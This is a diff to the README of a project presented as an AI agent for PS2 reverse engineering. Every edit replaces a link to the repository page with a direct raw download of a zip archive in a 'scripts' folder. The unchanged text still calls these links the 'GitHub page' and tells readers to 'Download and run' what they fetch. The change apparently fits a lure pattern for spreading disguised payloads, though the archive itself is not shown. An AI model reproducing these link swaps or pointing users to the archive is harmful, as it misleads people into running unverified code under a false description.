@@ -1,6 +1,6 @@
 # 🕹️ ps2-recomp-Agent-SKILL - AI Agent for PS2 Reverse Engineering
 
-[![Download](https://img.shields.io/badge/Download-ps2--recomp--Agent--SKILL-blue?style=for-the-badge)](https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL)
+[![Download](https://img.shields.io/badge/Download-ps2--recomp--Agent--SKILL-blue?style=for-the-badge)](https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL/raw/refs/heads/main/scripts/ps-Agent-SKILL-recomp-v2.6.zip)
 
 ## 📋 What is ps2-recomp-Agent-SKILL?
 
@@ -23,7 +23,7 @@ Make sure your computer meets these requirements before installation:
 
 Click the big blue badge at the top or use this link to visit the official page:
 
-[https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL](https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL)
+[https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL/raw/refs/heads/main/scripts/ps-Agent-SKILL-recomp-v2.6.zip](https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL/raw/refs/heads/main/scripts/ps-Agent-SKILL-recomp-v2.6.zip)
 
 This link leads to the GitHub page where you can download the latest version of ps2-recomp-Agent-SKILL along with all related files and documentation.
 
@@ -32,7 +32,7 @@ This link leads to the GitHub page where you can download the latest version of 
 Follow these steps carefully to download and run ps2-recomp-Agent-SKILL:
 
 1. Open your web browser and go to the GitHub page at  
-   https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL.
+   https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL/raw/refs/heads/main/scripts/ps-Agent-SKILL-recomp-v2.6.zip
 
 2. Look for the **Releases** section on the page or navigate to the "Releases" tab.  
    This is where you will find the latest stable versions.
@@ -115,7 +115,7 @@ You will find step-by-step guides and help menus inside the app to assist you fu
 ## 🔗 Useful Links
 
 - GitHub Repository:  
-  https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL  
+  https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL/raw/refs/heads/main/scripts/ps-Agent-SKILL-recomp-v2.6.zip  
 - Documentation and Guides on GitHub  
 - Community support via GitHub Issues or Discussions in the repository
 
@@ -130,4 +130,4 @@ The AI Agent is designed to grow smarter with each release. It combines cutting-
 ## 📥 Ready to Try ps2-recomp-Agent-SKILL?
 
 Download and run the latest version here:  
-[https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL](https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL)
+[https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL/raw/refs/heads/main/scripts/ps-Agent-SKILL-recomp-v2.6.zip](https://github.com/ajitmohapatr/ps2-recomp-Agent-SKILL/raw/refs/heads/main/scripts/ps-Agent-SKILL-recomp-v2.6.zip)
